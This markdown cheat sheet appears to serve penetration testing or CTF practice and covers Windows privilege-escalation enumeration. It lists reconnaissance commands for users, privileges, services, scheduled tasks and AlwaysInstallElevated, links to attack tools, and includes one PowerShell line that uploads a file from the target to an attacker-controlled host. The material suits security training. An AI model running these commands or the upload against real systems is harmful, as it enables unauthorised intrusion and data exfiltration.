# Windows PrivEsc 

**Step 1** Review PrivEsc Mind map
https://github.com/hxhBrofessor/PrivEsc-MindMap/blob/main/windows-mindMap.JPG 

**Step 2** Look around the file system!!! 

## Active Directory Methodology 
https://cr0mll.github.io/cyberclopaedia/Post%20Exploitation/Active%20Directory%20(AD)/index.html

## Basics 

(Manual Enum Guide)[https://fuzzysecurity.com/tutorials/16.html]

`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`

`whoami /all` 

`whoami /priv` 

`net users` 

`net localgroup`

`netstat -ano` 

`dsacls "DC=htb,DC=local"` 

## Scheduled Tasks 

### generate file 
`schtasks /query /fo LIST /v > scheduled-task.txt`

### transfer off Windows
`powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.49.192/upload.php', 'scheduled-task.txt')` 

### Grep results on Kali
`grep -i "SYSTEM" scheduled-task.txt -B 5 -A 5` 

## Services 

`wmic service list brief` 

`tasklist /v /fi "username eq system` 

`sc query state= all | findstr "SERVICE_NAME:" >> Services.txt` 

`wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """` 

## AlwaysInstallElevated 
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`

`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` 

## Metasploit module for exploit suggestions
`post/multi/recon/local_exploit_suggester` 

## Tools to run
(Watson for kernel exploit suggestions)[https://github.com/rasta-mouse/Watson, https://0xdf.gitlab.io/2019/03/05/htb-devel.html]
(winPEAS)[https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS]
(adPEAS)[https://github.com/61106960/adPEAS]
(Bloodhound)[https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux]
(Powerview)[https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/#ad-enumeration-with-powerview]
(Windows exploit suggester)[https://github.com/AonCyberLabs/Windows-Exploit-Suggester]
(Sherlock)[https://github.com/rasta-mouse/Sherlock](How to use Sherlock)[https://0xdf.gitlab.io/2021/03/17/htb-optimum.html]
(JAWS)[https://github.com/411Hall/JAWS]
